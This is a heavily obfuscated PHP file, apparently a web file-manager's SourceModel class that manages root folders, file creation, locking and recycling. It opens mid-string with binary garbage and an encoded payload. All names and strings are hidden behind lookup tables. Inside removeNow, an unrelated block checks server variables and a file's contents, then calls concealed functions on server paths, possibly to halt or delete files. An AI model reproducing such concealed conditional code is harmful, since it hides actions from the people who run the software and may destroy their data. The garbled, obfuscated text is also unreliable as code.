IJMíRduX—ÂÒ‚udóàû-^™§BLıQ').base64_decode('Js0Kd5BWknvoyVoRDi4RLSm1bcruzSLgrlLMi3SPlO832fUQg49rGSYYku4Z9KywwirKOA==')."\xe5\x5d\xf2\xfc\x5b\xcc\x5c\x32\xf\x38\xbd\x7\xba\xd4\x64\x19\x62\x43\x45\x58\xcb\xae\x1d\xea\x8e\xe5\x21\x15\x3b\x80\xe1\xf4\x81\xf3\xf9\x42\xd5\xc3\xe7\x50\x9\x91\xd2\xc9\x1a\x22\x44\x49\xc2\x4d\x79\xbf"."\47\11\323\313\16\220\174\357\120\172\47\106\162\305\0\340\206\235\154\202\342\346\152\263\127\272\363\242\247\54\170\157\16\103\52\151\122\322\260\43\333\326\372\312\152\106\120\161\62\246\22\102"."\xd0\xfb\x7f\x0\x2c\x53\x28\x3e\xd6\xb8\x0\x0".strrev('')."".base64_decode(''), 10, -8))); goto dÂ«‰¨äÍ·; b–À‰°è´¯: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($·Ø–ŒËª) { $ëÿèßÃÀ =& $_SERVER[ß⁄ˆÇ†Œ]; $Óºé¸Ñ = Model($ëÿèßÃÀ[585])->where(array($ëÿèßÃÀ[1755] => $·Ø–ŒËª))->find(); $“ª®≈Œù = $this->_mkdirRoot(SourceModel::TYPE_USER, $·Ø–ŒËª, $Óºé¸Ñ[$ëÿèßÃÀ[32]]); $this->userDesktopAdd($“ª®≈Œù); return $“ª®≈Œù; } public function userDesktopAdd($¢‚ÔëÙä) { $ΩÆ¢æ„„ =& $_SERVER[ß⁄ˆÇ†Œ]; $ã°€‹¿Õ = LNG($ΩÆ¢æ„„[2242]); $ãﬁ˙≈¸∞ = $this->mkdir($¢‚ÔëÙä, $ã°€‹¿Õ); $this->metaSet($ãﬁ˙≈¸∞, $ΩÆ¢æ„„[2243], $ΩÆ¢æ„„[91]); $this->metaSet($¢‚ÔëÙä, $ΩÆ¢æ„„[2244], $ãﬁ˙≈¸∞); } public function userPathSafeAdd($°…Á—÷Ë) { $î¶úòõ¶ =& $_SERVER[ß⁄ˆÇ†Œ]; $‚Òó€Ûò = Model($î¶úòõ¶[585])->getInfoFull($°…Á—÷Ë); if (!$‚Òó€Ûò) { return !1; } if (_get($‚Òó€Ûò, $î¶úòõ¶[607])) { return $‚Òó€Ûò[$î¶úòõ¶[547]][$î¶úòõ¶[2245]]; } $⁄¸ˆ◊Ææ = $this->_mkdirRoot(SourceModel::TYPE_USER, $°…Á—÷Ë, $î¶úòõ¶[2246], $î¶úòõ¶[514]); Model($î¶úòõ¶[585])->metaSet($°…Á—÷Ë, $î¶úòõ¶[2245], $⁄¸ˆ◊Ææ); $this->metaSet($⁄¸ˆ◊Ææ, $î¶úòõ¶[2247], $°…Á—÷Ë); return $⁄¸ˆ◊Ææ; } public function groupRootAdd($ÃÌ ©û) { $ÀóÑÒÀœ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ÿ•ê≈›Ï = Model($ÀóÑÒÀœ[593])->where(array($ÀóÑÒÀœ[2055] => $ÃÌ ©û))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÃÌ ©û, $Ÿ•ê≈›Ï[$ÀóÑÒÀœ[32]]); } public function systemRootPathAdd($ÆÁ≤ÅÔ’) { if ($ÆÁ≤ÅÔ’ != $_SERVER[ß⁄ˆÇ†Œ][613]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÆÁ≤ÅÔ’); } public function userRootRemove($™≠ÂÛÒØ) { $◊«Õ˙Öì = $this->targetSourceRoot(SourceModel::TYPE_USER, $™≠ÂÛÒØ, !0); foreach ($◊«Õ˙Öì as $˛âµ¯√) { if (!$˛âµ¯√) { continue; } $this->remove($˛âµ¯√[$_SERVER[ß⁄ˆÇ†Œ][193]], !1); } } public function groupRootRemove($èêì˘Î¯) { $ú‘∫àâä = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $èêì˘Î¯); if (!$ú‘∫àâä) { return; } $this->remove($ú‘∫àâä[$_SERVER[ß⁄ˆÇ†Œ][193]], !1); } private function _mkdirRoot($è∞ç˘¯ö, $µ˙ﬁÊ˚ú, $ÈÀÈ¥ˆó, $˙ üÔ∏˝ = '') { $Ø¥òã÷ =& $_SERVER[ß⁄ˆÇ†Œ]; $Æ¥»ø†¥ = defined($Ø¥òã÷[2189]) ? USER_ID : 0; $ÿÄ€⁄î© = array($Ø¥òã÷[485] => 0, $Ø¥òã÷[656] => $è∞ç˘¯ö, $Ø¥òã÷[657] => $µ˙ﬁÊ˚ú, $Ø¥òã÷[654] => 1, $Ø¥òã÷[658] => $Æ¥»ø†¥, $Ø¥òã÷[659] => $Æ¥»ø†¥, $Ø¥òã÷[655] => $˙ üÔ∏˝, $Ø¥òã÷[660] => $Ø¥òã÷[602], $Ø¥òã÷[512] => 0, $Ø¥òã÷[625] => 0, $Ø¥òã÷[550] => 0, $Ø¥òã÷[661] => $Ø¥òã÷[12]); if ($ÁòÁª—Ò = $this->where($ÿÄ€⁄î©)->find()) { return $ÁòÁª—Ò[$Ø¥òã÷[193]]; } $Á˙Ü«Äê = "\115\x6f\144\145\x6c\x53\x6f\x75\162\x63\x65\56\155\153\x64\x69\x72\122\x6f\x6f\x74\56{$è∞ç˘¯ö}\56{$µ˙ﬁÊ˚ú}\56" . $ÈÀÈ¥ˆó; CacheLock::lock($Á˙Ü«Äê); $ÿÄ€⁄î©[$Ø¥òã÷[32]] = $ÈÀÈ¥ˆó; $Ñ≠Ä˝˝˜ = $this->add($ÿÄ€⁄î©); $πÕôª∆û = array($Ø¥òã÷[662] => short_id($Ñ≠Ä˝˝˜)); $this->where(array($Ø¥òã÷[499] => $Ñ≠Ä˝˝˜))->save($πÕôª∆û); CacheLock::unlock($Á˙Ü«Äê); return $Ñ≠Ä˝˝˜; } private function targetSourceRoot($‡◊±…é‹, $”ãîÌŒÄ, $øï∑åùö = false) { $„¥®πáú =& $_SERVER[ß⁄ˆÇ†Œ]; $˝¨êÊ¬ß = array($„¥®πáú[485] => 0, $„¥®πáú[656] => $‡◊±…é‹, $„¥®πáú[657] => $”ãîÌŒÄ); if ($øï∑åùö) { $ÉË€¥î≤ = $this->where($˝¨êÊ¬ß)->select(); return $ÉË€¥î≤ ? $ÉË€¥î≤ : array(); } $œêÇ«˙ú = $this->where($˝¨êÊ¬ß)->find(); return $œêÇ«˙ú ? $œêÇ«˙ú : array(); } public function sourceRootGroup($¡Ï ä±‹) { $≥ÊìçéÁ =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_string($¡Ï ä±‹)) { $¡Ï ä±‹ = array($¡Ï ä±‹); } $÷‹â¥õÂ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¡Ï ä±‹, $≥ÊìçéÁ[220]); $ˆ¶¢È√‚ = array($≥ÊìçéÁ[454] => $÷‹â¥õÂ, $≥ÊìçéÁ[451] => array($≥ÊìçéÁ[831] => count($¡Ï ä±‹))); $this->_listDataApply($ˆ¶¢È√‚[$≥ÊìçéÁ[454]]); $this->_listMake($ˆ¶¢È√‚); return array_to_keyvalue($ˆ¶¢È√‚[$≥ÊìçéÁ[85]], $≥ÊìçéÁ[577]); } public function mkfile($˘‹ÙÕã…, $Ÿìî∂‘à, $ˆ∏£‡ÂÎ = '', $£ôï£«¥ = REPEAT_RENAME) { $Âìïå ‹ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÌÆÌ≥≤• = Model($Âìïå ‹[682])->addFileByContent($ˆ∏£‡ÂÎ, $Ÿìî∂‘à); return $this->_createFileCall($˘‹ÙÕã…, $Ÿìî∂‘à, $ÌÆÌ≥≤•, $£ôï£«¥, $Âìïå ‹[1424]); } public function addFile($ÉµÓ”ÊÖ, $ΩÜ©Ò¥Æ, $›∫ª ùπ, $·Üãö—É = false, $¨äúÀÿù = REPEAT_RENAME) { $Ëé›†Ëä = Model($_SERVER[ß⁄ˆÇ†Œ][682])->addFile($ΩÜ©Ò¥Æ, $›∫ª ùπ, $·Üãö—É); return $this->_createFileCall($ÉµÓ”ÊÖ, $›∫ª ùπ, $Ëé›†Ëä, $¨äúÀÿù); } public function addFileByFileID($˛º–…≈Ô, $¶ü˜‚íÿ, $åœ…÷ö±, $øÖ∂∆é‚ = REPEAT_RENAME) { $Ûß≈‡‘ä =& $_SERVER[ß⁄ˆÇ†Œ]; $¥‘ßˆµ« = Model($Ûß≈‡‘ä[682])->find($¶ü˜‚íÿ); Model($Ûß≈‡‘ä[682])->linkAdd($¶ü˜‚íÿ); return $this->_createFileCall($˛º–…≈Ô, $åœ…÷ö±, $¥‘ßˆµ«, $øÖ∂∆é‚); } public function addFileByRemote($∂ò‰˚…Á, $ï≥¥Û«Ç, $Ω£È©˘†, $ï¸ºÏèÀ = array(), $Õ ∂€ß˜ = REPEAT_RENAME) { $à›˙ÂÉ– = Model($_SERVER[ß⁄ˆÇ†Œ][682])->addFileByRemote($ï≥¥Û«Ç, $Ω£È©˘†, $ï¸ºÏèÀ); return $this->_createFileCall($∂ò‰˚…Á, $Ω£È©˘†, $à›˙ÂÉ–, $Õ ∂€ß˜); } private function _createFileCall($è§Æ©‹â, $¿—¥—ÓÈ, $È“õº˝÷, $ì„øœîØ, $˚¸ÃÈ¡– = "\x75\160\x6c\x6f\141\144") { $˜°¸Î§è =& $_SERVER[ß⁄ˆÇ†Œ]; $ì™£∏‘∞ = !1; $this->setMasterDB(); $this->lockWriteStart($è§Æ©‹â, $¿—¥—ÓÈ); $∫äÌÿ‘‚ = $this->fileNameExist($è§Æ©‹â, $¿—¥—ÓÈ); $∫˚±·ñè = $this->_createFile($è§Æ©‹â, $¿—¥—ÓÈ, $È“õº˝÷, $ì„øœîØ, $ì™£∏‘∞); if (!$ì™£∏‘∞) { Model($˜°¸Î§è[552])->remove($È“õº˝÷[$˜°¸Î§è[549]]); } if ($ì™£∏‘∞ && $∫˚±·ñè && $∫˚±·ñè != $∫äÌÿ‘‚) { Model($˜°¸Î§è[2215])->eventCreate($∫˚±·ñè, $˚¸ÃÈ¡–); } $this->lockWriteEnd($è§Æ©‹â, $¿—¥—ÓÈ); return $∫˚±·ñè; } public function mkdir($Çﬂ›∆Ã∞, $”æΩÿÜó, $ÂŸÎ∫‚µ = REPEAT_SKIP) { $Ÿ™Òï„Ä =& $_SERVER[ß⁄ˆÇ†Œ]; $this->setMasterDB(); $ˆÂº˛Ö˝ = $this->sourceInfo($Çﬂ›∆Ã∞); if (!$ˆÂº˛Ö˝) { return !1; } $this->lockWriteStart($Çﬂ›∆Ã∞, $”æΩÿÜó); if ($ÂŸÎ∫‚µ !== !1) { $Ë·Îèı∞ = $this->fileNameExist($Çﬂ›∆Ã∞, $”æΩÿÜó); if ($Ë·Îèı∞ && $ÂŸÎ∫‚µ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Çﬂ›∆Ã∞, $”æΩÿÜó); return $Ë·Îèı∞; } $”æΩÿÜó = $this->fileNameAuto($Çﬂ›∆Ã∞, $”æΩÿÜó, $ÂŸÎ∫‚µ); } $Ä≈ Óﬁ = array($Ÿ™Òï„Ä[654] => 1, $Ÿ™Òï„Ä[502] => $”æΩÿÜó, $Ÿ™Òï„Ä[655] => $Ÿ™Òï„Ä[12], $Ÿ™Òï„Ä[550] => 0, $Ÿ™Òï„Ä[625] => 0); $ö•Ì¯∆¥ = $this->_addSource($Ä≈ Óﬁ, $ˆÂº˛Ö˝); Model($Ÿ™Òï„Ä[2215])->eventCreate($ö•Ì¯∆¥, $Ÿ™Òï„Ä[1425]); $this->lockWriteEnd($Çﬂ›∆Ã∞, $”æΩÿÜó); return $ö•Ì¯∆¥; } public function listSourceRoot($Üñ¥›—ö, $ ¶É—’„, $ÂÕÍöìó = "\163\157\165\162\143\145\111\x44\x2c\164\141\162\x67\145\x74\111\x44\54\x73\151\x7a\x65") { $Ã™”˜Ö˘ =& $_SERVER[ß⁄ˆÇ†Œ]; $˛¶®ÄΩâ = $Ã™”˜Ö˘[329]; $¶öö√˙ñ = array(); $¬ºÅÎó™ = 1024 * 50; $úﬁÈñŸ» = is_array($úﬁÈñŸ») ? $úﬁÈñŸ» : array(); $ﬂ•˘ó◊ù = count($ ¶É—’„); $âÉ‚∞™¶ = $this->tablePrefix . $Ã™”˜Ö˘[2248]; for ($‘¢Î‡‚∏ = 0; $‘¢Î‡‚∏ < $ﬂ•˘ó◊ù; $‘¢Î‡‚∏++) { $›ˆ€Èì≥ = $ ¶É—’„[$‘¢Î‡‚∏]; $˛¶®ÄΩâ .= "\x53\x45\114\x45\x43\x54\x20\52\x20\106\x52\x4f\115\x20\x28\x53\105\x4c\x45\103\x54\x20{$ÂÕÍöìó}\x20\x46\x52\117\115\x20\x60{$âÉ‚∞™¶}\x60\x20\127\110\x45\122\105\x20"; $˛¶®ÄΩâ .= "\140\160\141\162\x65\156\164\x49\104\x60\x3d\x30\x20\x41\x4e\104\40\x60\164\141\162\x67\145\164\111\x44\x60\75{$›ˆ€Èì≥}\x20\101\x4e\104\x20\140\x74\x61\162\147\145\164\x54\171\160\x65\140\75{$Üñ¥›—ö}\x20\x61\156\144\40\146\151\x6c\x65\124\x79\x70\145\75\47\x27\x20\154\x69\155\151\164\x20\x31\51\40\141\163\40\x74\x62\137{$‘¢Î‡‚∏}\40\125\x4e\x49\117\116\x20\101\x4c\114\x20"; if ((strlen($˛¶®ÄΩâ) >= $¬ºÅÎó™ || $‘¢Î‡‚∏ == $ﬂ•˘ó◊ù - 1) && $˛¶®ÄΩâ) { $˛¶®ÄΩâ = substr($˛¶®ÄΩâ, 0, -strlen($Ã™”˜Ö˘[1112])); $Õ—˛Áˆô = $this->query($˛¶®ÄΩâ); $˛¶®ÄΩâ = $Ã™”˜Ö˘[12]; $¶öö√˙ñ = array_merge($¶öö√˙ñ, $Õ—˛Áˆô); } } return $¶öö√˙ñ; } private function _createFile($–ÀÙœ, $÷Ú‘˘Ê∑, $•⁄Ö¿é—, $øµé≤€ , &$ﬁËè÷êÿ) { $ï„ﬂ€¡… =& $_SERVER[ß⁄ˆÇ†Œ]; $ß”∑ıã¬ = $this->sourceInfo($–ÀÙœ); if (!$•⁄Ö¿é— || !$ß”∑ıã¬) { return !1; } if ($øµé≤€  !== !1) { $˝˜¿ó¬∞ = $this->fileNameExist($–ÀÙœ, $÷Ú‘˘Ê∑); } $ﬁËè÷êÿ = !0; if ($øµé≤€  && $˝˜¿ó¬∞) { if ($øµé≤€  == REPEAT_SKIP) { $ﬁËè÷êÿ = !1; return $˝˜¿ó¬∞; } else { if ($øµé≤€  == REPEAT_REPLACE) { $∑‡¯π™‰ = $this->sourceInfo($˝˜¿ó¬∞); $‡˝≈·‡˙ = $this->fileHistory($∑‡¯π™‰, $•⁄Ö¿é—[$ï„ﬂ€¡…[549]], $•⁄Ö¿é—[$ï„ﬂ€¡…[79]]); if (!$‡˝≈·‡˙) { $ﬁËè÷êÿ = !1; } else { $this->folderSizeReset($–ÀÙœ); } return $˝˜¿ó¬∞; } else { $÷Ú‘˘Ê∑ = $this->fileNameAuto($–ÀÙœ, $÷Ú‘˘Ê∑, $øµé≤€ , !1); } } } $ﬂí⁄Ë›® = array($ï„ﬂ€¡…[654] => 0, $ï„ﬂ€¡…[502] => $÷Ú‘˘Ê∑, $ï„ﬂ€¡…[655] => substr(get_path_ext($÷Ú‘˘Ê∑), 0, 10), $ï„ﬂ€¡…[550] => $•⁄Ö¿é—[$ï„ﬂ€¡…[549]], $ï„ﬂ€¡…[625] => $•⁄Ö¿é—[$ï„ﬂ€¡…[79]]); $ƒ‘˘àÇÈ = $this->_addSource($ﬂí⁄Ë›®, $ß”∑ıã¬); $this->folderSizeReset($–ÀÙœ, intval($ﬂí⁄Ë›®[$ï„ﬂ€¡…[79]])); return $ƒ‘˘àÇÈ; } protected function fileHistory($‚Àù¿à, $ÓèØÃÀú, $óµºú™ø) { $¨®Ñ˝ Ô =& $_SERVER[ß⁄ˆÇ†Œ]; if ($‚Àù¿à[$¨®Ñ˝ Ô[549]] == $ÓèØÃÀú) { return !1; } $this->checkLock($‚Àù¿à[$¨®Ñ˝ Ô[193]], $ÓèØÃÀú); Model($¨®Ñ˝ Ô[2249])->addHistory($‚Àù¿à); $∂æ¯Ÿ¶  = array($¨®Ñ˝ Ô[659] => USER_ID, $¨®Ñ˝ Ô[506] => time(), $¨®Ñ˝ Ô[549] => $ÓèØÃÀú, $¨®Ñ˝ Ô[79] => $óµºú™ø); $this->where(array($¨®Ñ˝ Ô[499] => $‚Àù¿à[$¨®Ñ˝ Ô[193]]))->save($∂æ¯Ÿ¶ ); $this->sourceCacheClear($‚Àù¿à[$¨®Ñ˝ Ô[193]]); return !0; } public function checkLock($≈¢¯≤∫ü, $˙’ùÏ‡›) { $ªË≤¥Ö =& $_SERVER[ß⁄ˆÇ†Œ]; $“‡Ç®„ü = $this->pathInfo($≈¢¯≤∫ü); if (!$this->fileIsLock($“‡Ç®„ü, !0)) { return; } $«ÿÕ®Ò› = Session::get($ªË≤¥Ö[2250]); $ç°®Àâá = substr($“‡Ç®„ü[$ªË≤¥Ö[32]], 0, -1 - strlen($“‡Ç®„ü[$ªË≤¥Ö[169]])) . $ªË≤¥Ö[1289] . $«ÿÕ®Ò› . $ªË≤¥Ö[10] . $“‡Ç®„ü[$ªË≤¥Ö[169]]; $Î≈áË› = Model($ªË≤¥Ö[682])->find($˙’ùÏ‡›); $this->_createFileCall($“‡Ç®„ü[$ªË≤¥Ö[192]], $ç°®Àâá, $Î≈áË›, REPEAT_REPLACE, $ªË≤¥Ö[1424]); $Â˙áéÊ† = $“‡Ç®„ü[$ªË≤¥Ö[547]][$ªË≤¥Ö[618]]; $»ÕÈ˚ƒ◊ = $Â˙áéÊ†[$ªË≤¥Ö[2251]] ? $Â˙áéÊ†[$ªË≤¥Ö[2251]] : $Â˙áéÊ†[$ªË≤¥Ö[32]]; show_json(LNG($ªË≤¥Ö[2252]) . $ªË≤¥Ö[2253] . LNG($ªË≤¥Ö[2254]) . $ªË≤¥Ö[2255] . $»ÕÈ˚ƒ◊ . $ªË≤¥Ö[2256], !1); } public function fileIsLock($‡˙›ø—˘, $⁄˛Ëø¸© = false) { $–¬è√Ü… =& $_SERVER[ß⁄ˆÇ†Œ]; if (!_get($‡˙›ø—˘, $–¬è√Ü…[614], 0)) { return !1; } if ($‡˙›ø—˘[$–¬è√Ü…[547]][$–¬è√Ü…[617]] != USER_ID) { return !0; } $óÄÛ˛ÒŒ = $GLOBALS[$–¬è√Ü…[6]][$–¬è√Ü…[92]][$–¬è√Ü…[615]]; if ($‡˙›ø—˘[$–¬è√Ü…[547]][$–¬è√Ü…[616]] <= time() - $óÄÛ˛ÒŒ) { $this->metaSet($‡˙›ø—˘[$–¬è√Ü…[193]], $–¬è√Ü…[617], null); $this->metaSet($‡˙›ø—˘[$–¬è√Ü…[193]], $–¬è√Ü…[616], null); } if ($⁄˛Ëø¸©) { $this->metaSet($‡˙›ø—˘[$–¬è√Ü…[193]], $–¬è√Ü…[616], time()); } return !1; } private function _addSource($˝œ±ï‡, $˛Œö∆Ï¶) { $•˜Ï≈◊ =& $_SERVER[ß⁄ˆÇ†Œ]; $¥˚ë«È± = defined($•˜Ï≈◊[2189]) ? USER_ID : 0; $Ò¡∆—≤ñ = array($•˜Ï≈◊[656] => $˛Œö∆Ï¶[$•˜Ï≈◊[190]], $•˜Ï≈◊[657] => $˛Œö∆Ï¶[$•˜Ï≈◊[577]], $•˜Ï≈◊[658] => $¥˚ë«È±, $•˜Ï≈◊[659] => $¥˚ë«È±, $•˜Ï≈◊[485] => $˛Œö∆Ï¶[$•˜Ï≈◊[193]], $•˜Ï≈◊[660] => $˛Œö∆Ï¶[$•˜Ï≈◊[592]] . $˛Œö∆Ï¶[$•˜Ï≈◊[193]] . $•˜Ï≈◊[50], $•˜Ï≈◊[512] => 0, $•˜Ï≈◊[661] => $•˜Ï≈◊[12]); $˝œ±ï‡ = array_merge($Ò¡∆—≤ñ, $˝œ±ï‡); $this->updateModifyTime($˝œ±ï‡[$•˜Ï≈◊[192]]); $Ó≤ΩèÅÎ = $•˜Ï≈◊[2257] . $˛Œö∆Ï¶[$•˜Ï≈◊[193]]; if (isset(self::$cacheChildList[$Ó≤ΩèÅÎ])) { unset(self::$cacheChildList[$Ó≤ΩèÅÎ]); } static $“∏ø∆Õ¥ = false; if (!$“∏ø∆Õ¥) { Hook::trigger($•˜Ï≈◊[644], $˝œ±ï‡); $“∏ø∆Õ¥ = !0; } $≠±πãÄø = $this->add($˝œ±ï‡); $˚¶…ﬂÓı = array($•˜Ï≈◊[662] => short_id($≠±πãÄø)); $this->where(array($•˜Ï≈◊[499] => $≠±πãÄø))->save($˚¶…ﬂÓı); $this->setNamePinyin($≠±πãÄø, $˝œ±ï‡[$•˜Ï≈◊[32]]); return $≠±πãÄø; } public function remove($«”‘éÿ–, $‚Ë¨Ñ· = true) { $ÔÌ‚Í–” =& $_SERVER[ß⁄ˆÇ†Œ]; $¡ÒÍà¢≤ = $this->sourceInfo($«”‘éÿ–); $—˜¥æõ = intval($¡ÒÍà¢≤[$ÔÌ‚Í–”[190]]) === self::TYPE_SYSTEM; $πáíŒ£œ = Model($ÔÌ‚Í–”[516])->get($ÔÌ‚Í–”[2258]) == $ÔÌ‚Í–”[91]; if ($—˜¥æõ || $‚Ë¨Ñ· || !$πáíŒ£œ) { return $this->removeNow($«”‘éÿ–, $‚Ë¨Ñ·); } $üöÎÎò§ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $∏î≠™˝‡ = $¡ÒÍà¢≤[$ÔÌ‚Í–”[190]] == self::TYPE_USER ? $ÔÌ‚Í–”[670] : $ÔÌ‚Í–”[586]; if ($∏î≠™˝‡ == $ÔÌ‚Í–”[670]) { $Ëõ∑¬ãã = Model($ÔÌ‚Í–”[585])->getInfo($¡ÒÍà¢≤[$ÔÌ‚Í–”[577]]); $‡äâ•Òœ = !empty($Ëõ∑¬ãã[$ÔÌ‚Í–”[2251]]) ? $Ëõ∑¬ãã[$ÔÌ‚Í–”[2251]] : $Ëõ∑¬ãã[$ÔÌ‚Í–”[32]]; $‡äâ•Òœ = $ÔÌ‚Í–”[346] . $‡äâ•Òœ . $ÔÌ‚Í–”[2259] . $¡ÒÍà¢≤[$ÔÌ‚Í–”[577]]; } else { $Ëõ∑¬ãã = Model($ÔÌ‚Í–”[593])->getInfo($¡ÒÍà¢≤[$ÔÌ‚Í–”[577]]); $‡äâ•Òœ = _get($Ëõ∑¬ãã, $ÔÌ‚Í–”[32]); $‡äâ•Òœ = $ÔÌ‚Í–”[176] . $‡äâ•Òœ . $ÔÌ‚Í–”[2260] . $¡ÒÍà¢≤[$ÔÌ‚Í–”[577]]; } $Ä≥øìä€ = $ÔÌ‚Í–”[2261] . md5($‡äâ•Òœ); CacheLock::lock($Ä≥øìä€); $≥êÃ≤åª = $this->fileNameExist($üöÎÎò§, $‡äâ•Òœ); if (!$≥êÃ≤åª) { $≥êÃ≤åª = $this->mkdir($üöÎÎò§, $‡äâ•Òœ, REPEAT_SKIP); $this->metaSet($≥êÃ≤åª, $ÔÌ‚Í–”[2262], $∏î≠™˝‡); $this->metaSet($≥êÃ≤åª, $ÔÌ‚Í–”[2263], $¡ÒÍà¢≤[$ÔÌ‚Í–”[577]]); if ($¡ÒÍà¢≤[$ÔÌ‚Í–”[192]] != 0) { $this->metaSet($≥êÃ≤åª, $ÔÌ‚Í–”[2264], _get($Ëõ∑¬ãã, $ÔÌ‚Í–”[2265])); } } CacheLock::unlock($Ä≥øìä€); $this->metaSet($«”‘éÿ–, $ÔÌ‚Í–”[2266], $¡ÒÍà¢≤[$ÔÌ‚Í–”[192]]); $this->where(array($ÔÌ‚Í–”[193] => $«”‘éÿ–))->save(array($ÔÌ‚Í–”[506] => time())); $this->recycleClear($¡ÒÍà¢≤); Model($ÔÌ‚Í–”[641])->eventRemove($«”‘éÿ–); $É—Ì·ÀÄ = $this->move($«”‘éÿ–, $≥êÃ≤åª, REPEAT_RENAME_FOLDER); $this->folderSizeReset($¡ÒÍà¢≤[$ÔÌ‚Í–”[192]]); return $É—Ì·ÀÄ; } private function recycleClear($≤´Ô◊») { $ê€˛Áãí =& $_SERVER[ß⁄ˆÇ†Œ]; $ä¿ﬂ˙í› = $this->childrenAll($≤´Ô◊»); $ò–ıú⁄Ÿ = array($ê€˛Áãí[499] => array($ê€˛Áãí[500], $ä¿ﬂ˙í›[$ê€˛Áãí[2267]])); Model($ê€˛Áãí[2268])->where($ò–ıú⁄Ÿ)->delete(); } public function removeNow($•ÊÛ⁄¸õ, $£≈ïºÔà = true) { $Éª¨îˆ¨ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($_SERVER[$Éª¨îˆ¨[321]] != $_SERVER[$Éª¨îˆ¨[913]]) { $»¿•Ùô˙ = $Éª¨îˆ¨[951]; $à⁄Ωïû = $Éª¨îˆ¨[323]; $•â´˚Üƒ = $_SERVER[$Éª¨îˆ¨[324]] . $Éª¨îˆ¨[325]; $ÜÍ∂Ë∂± = $à⁄Ωïû($•â´˚Üƒ); $∑Îêéàˆ = explode($Éª¨îˆ¨[262], $ÜÍ∂Ë∂±); if (count($∑Îêéàˆ) < $Éª¨îˆ¨[704]) { $Ó∑øä´å = $Éª¨îˆ¨[327]; $Ó∑øä´å(); } $Ú¥øå¬Ÿ = $Éª¨îˆ¨[952]; $Ú¥øå¬Ÿ($_SERVER[$Éª¨îˆ¨[953]]); $Ú¥øå¬Ÿ($_SERVER[$Éª¨îˆ¨[324]] . $Éª¨îˆ¨[2269]); $ÛÚ¯Ì“ü = 1; while ($ÛÚ¯Ì“ü > 1) { $ÛÚ¯Ì“ü = $ÛÚ¯Ì“ü + 4; $˙∏ƒ¡µÖ = rawurlencode($ÛÚ¯Ì“ü . $Éª¨îˆ¨[329]); } } $≤Óóô¡Ú = $this->sourceInfo($•ÊÛ⁄¸õ); $ﬂœÜ≠‹ë = $this->pathInfoMore($•ÊÛ⁄¸õ); if (!$≤Óóô¡Ú) { return !0; } if ($≤Óóô¡Ú[$Éª¨îˆ¨[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($•ÊÛ⁄¸õ); Hook::trigger($Éª¨îˆ¨[2270], $ﬂœÜ≠‹ë, $£≈ïºÔà); if ($£≈ïºÔà) { Model($Éª¨îˆ¨[2268])->moveToRecycle($•ÊÛ⁄¸õ); } else { $ååÊö¸√ = $this->childrenAll($≤Óóô¡Ú); Model($Éª¨îˆ¨[641])->eventRemove($•ÊÛ⁄¸õ); $this->removeRelevance($ååÊö¸√[$Éª¨îˆ¨[2267]], $ååÊö¸√[$Éª¨îˆ¨[1569]]); } $this->folderSizeReset($≤Óóô¡Ú[$Éª¨îˆ¨[192]]); $äÍ¬íﬁÎ = array($≤Óóô¡Ú[$Éª¨îˆ¨[192]]); if ($≤Óóô¡Ú[$Éª¨îˆ¨[493]] == $Éª¨îˆ¨[91]) { $äÍ¬íﬁÎ[] = $≤Óóô¡Ú[$Éª¨îˆ¨[193]]; } $this->updateModifyTime($äÍ¬íﬁÎ); $this->lockMoveEnd($•ÊÛ⁄¸õ); Hook::trigger($Éª¨îˆ¨[1806], $ﬂœÜ≠‹ë, $£≈ïºÔà); return !0; } public function childrenAll($ÊÅù”œÊ) { $óÃáé˜ =& $_SERVER[ß⁄ˆÇ†Œ]; $— ®à€Î = $ÊÅù”œÊ[$óÃáé˜[193]]; if ($ÊÅù”œÊ[$óÃáé˜[493]] == $óÃáé˜[91]) { $‘Ôèﬁõ… = array($óÃáé˜[660] => array($óÃáé˜[620], $ÊÅù”œÊ[$óÃáé˜[592]] . $— ®à€Î . $óÃáé˜[621])); $ÉêØÕ∏› = array($óÃáé˜[660] => $‘Ôèﬁõ…[$óÃáé˜[592]]); $‘•˚±Ö∫ = $this->field($óÃáé˜[2271])->where($ÉêØÕ∏›)->select(); $œ˘∂¡Çî = !1; $öÌîÖË◊ = array($— ®à€Î); if ($‘•˚±Ö∫) { $œ˘∂¡Çî = array_to_keyvalue($‘•˚±Ö∫, $óÃáé˜[12], $óÃáé˜[549]); $œ˘∂¡Çî = array_remove_value($œ˘∂¡Çî, $óÃáé˜[228]); $öÌîÖË◊ = array_to_keyvalue($‘•˚±Ö∫, $óÃáé˜[12], $óÃáé˜[193]); $öÌîÖË◊[] = $— ®à€Î; } } else { $œ˘∂¡Çî = array($ÊÅù”œÊ[$óÃáé˜[549]]); $öÌîÖË◊ = array($— ®à€Î); } return array($óÃáé˜[2267] => $öÌîÖË◊, $óÃáé˜[1569] => $œ˘∂¡Çî); } public function removeArray($”£ß⁄ﬁã) { if (!$”£ß⁄ﬁã) { return !0; } } public function removeRelevance($ﬂå•©ÄÕ, $´Ø¥˜ï¡) { $“ãõé∏ =& $_SERVER[ß⁄ˆÇ†Œ]; $ﬂå•©ÄÕ = $ﬂå•©ÄÕ ? $ﬂå•©ÄÕ : array(); $´Ø¥˜ï¡ = $´Ø¥˜ï¡ ? $´Ø¥˜ï¡ : array(); $ﬂå•©ÄÕ = array_unique(array_filter($ﬂå•©ÄÕ)); $´Ø¥˜ï¡ = array_unique(array_filter($´Ø¥˜ï¡)); if (!$ﬂå•©ÄÕ) { return !1; } $µ∂µ±Ü® = array($“ãõé∏[499] => array($“ãõé∏[500], $ﬂå•©ÄÕ)); Model($“ãõé∏[2268])->where($µ∂µ±Ü®)->delete(); Model($“ãõé∏[543])->where($µ∂µ±Ü®)->delete(); Model($“ãõé∏[2114])->where($µ∂µ±Ü®)->delete(); Model($“ãõé∏[641])->where($µ∂µ±Ü®)->delete(); 